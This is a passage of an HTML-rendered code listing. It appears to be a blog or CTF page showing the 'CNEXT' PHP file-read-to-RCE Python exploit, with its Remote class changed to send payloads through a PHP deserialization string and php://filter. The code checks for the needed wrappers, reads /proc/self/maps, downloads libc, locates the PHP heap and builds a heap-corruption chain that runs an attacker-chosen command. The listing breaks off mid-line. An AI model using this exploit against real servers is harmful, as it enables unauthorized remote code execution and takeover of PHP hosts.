class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment"># # 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># # 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@entry</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep_time&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    url: <span class="built_in">str</span></span><br><span class="line">    command: <span class="built_in">str</span></span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span></span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.remote = Remote(self.url)</span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)</span><br><span class="line">        self.info = &#123;&#125;</span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rep=self.remote.download(path)</span><br><span class="line">                <span class="keyword">return</span> rep</span><br><span class="line">            <span class="keyword">except</span> ConnectionError:</span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">            result = safe_download(path)</span><br><span class="line">            <span class="keyword">return</span> text.encode() == result</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()</span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        result = safe_download(path)</span><br><span class="line">        <span class="comment">#print(base64.encode(result))</span></span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">        maps = maps.decode()</span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">        )</span><br><span class="line">        regions = []</span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    path = <span class="string">&quot;&quot;</span></span><br><span class="line">                current = Region(start, stop, permissions, path)</span><br><span class="line">                regions.append(current)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maps)</span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span></span><br><span class="line">        regions = self.get_regions()</span><br><span class="line"></span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span></span><br><span class="line">        data = self.get_file(remote_path)</span><br><span class="line">        Path(local_path).write(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">        heaps = [</span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">            <span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">        first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.check_vulnerable()</span><br><span class="line">        self.get_symbols_and_addresses()</span><br><span class="line">        self.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"></span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span></span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span 